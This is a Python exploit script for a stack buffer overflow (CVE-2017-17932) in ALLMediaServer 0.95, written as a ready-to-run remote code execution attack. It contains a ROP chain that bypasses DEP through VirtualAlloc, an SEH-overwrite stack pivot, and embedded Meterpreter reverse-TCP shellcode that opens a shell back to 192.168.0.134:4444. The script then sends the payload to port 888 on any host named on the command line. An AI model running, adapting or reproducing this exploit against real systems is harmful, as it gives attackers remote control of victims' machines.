#!/usr/bin/python
# Exploit Title: Stack Buffer Overflow in ALLMediaServer 0.95
# Exploit Author: Mario Kartone Ciccarelli
# Contact: https://twitter.com/Kartone
# CVE: CVE-2017-17932
# Date: 09-01-2018
# Thanks to PoC: https://www.exploit-db.com/exploits/43406/
# Software link: http://www.allmediaserver.org/download
# Version: 0.95
# Attack: Remote Code Execution
# Tested on: Windows 7 x64 Ultimate Eng SP1
#

import sys
import socket
import struct

def main():

   def create_rop_chain():

    rop_gadgets = [
      0x00407f5d,  # POP EAX # RETN [MediaServer.exe]
      0x00797250,  # ptr to &VirtualAlloc() [IAT MediaServer.exe]
      0x004061db,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [MediaServer.exe]
      0x0053bc02,  # XCHG EAX,ESI # RETN [MediaServer.exe]
      0x006c71f8,  # POP EBP # RETN [MediaServer.exe]
      0x00449a05,  # & jmp esp [MediaServer.exe]
      0x0049bbc4,  # POP EBX # RETN [MediaServer.exe]
      0x00000001,  # 0x00000001-> ebx
      0x00500b33,  # POP EDX # RETN [MediaServer.exe]
      0x00001000,  # 0x00001000-> edx
      0x006b5c67,  # POP ECX # RETN [MediaServer.exe]
      0x00000040,  # 0x00000040-> ecx
      0x0042365d,  # POP EDI # RETN [MediaServer.exe]
      0x006def0d,  # RETN (ROP NOP) [MediaServer.exe]
      0x0040710f,  # POP EAX # RETN [MediaServer.exe]
      0x90909090,  # nop
      0x0068c35c,  # PUSHAD # RETN [MediaServer.exe]
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

   rop_chain = create_rop_chain()

   # msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.134 lport=4444 -f python
   shellcode32 =  ""
   shellcode32 += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
   shellcode32 += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
   shellcode32 += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
   shellcode32 += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
   shellcode32 += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
   shellcode32 += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
   shellcode32 += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
   shellcode32 += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
   shellcode32 += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
   shellcode32 += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
   shellcode32 += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
   shellcode32 += "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
   shellcode32 += "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
   shellcode32 += "\xff\xd5\x6a\x0a\x68\xc0\xa8\x00\x86\x68\x02\x00\x11"
   shellcode32 += "\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
   shellcode32 += "\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5"
   shellcode32 += "\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec"
   shellcode32 += "\xe8\x61\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02"
   shellcode32 += "\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a"
   shellcode32 += "\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53"
   shellcode32 += "\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
   shellcode32 += "\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x22\x58\x68\x00\x40"
   shellcode32 += "\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57"
   shellcode32 += "\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\xe9"
   shellcode32 += "\x71\xff\xff\xff\x01\xc3\x29\xc6\x75\xc7\xc3\xbb\xf0"
   shellcode32 += "\xb5\xa2\x56\x6a\x00\x53\xff\xd5"

   # Stack-pivot at 0x0042b356 : {pivot 2052 / 0x804} :  # ADD ESP,800 # POP EBX # RETN    ** [MediaServer.exe] **   |  startnull {PAGE_EXECUTE_READ}

   size = 3000
   seh_offset = 1072
   sp_offset = 548

   buffer  = ""
   buffer += "A" * sp_offset
   buffer += rop_chain
   buffer += "\xe9\xcb\x01\x00\x00" # JMP $1d0
   buffer += "A" * (seh_offset - len(buffer))
   buffer += "\xff\xff\xff\xff" # NSEH record
   buffer += struct.pack('<L', 0x0042b356 ) # Stackpivot on SEH record
   buffer += shellcode32
   buffer += "B" * (size - len(buffer))

   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((sys.argv[1], 888))
   print "[+] AllMediaServer 0.95 Stack Buffer Overflow Exploit"
   print "[+] Sending evil payload to " + sys.argv[1] + "..."
   s.send(buffer)
   s.close()


if __name__ == '__main__':

   main()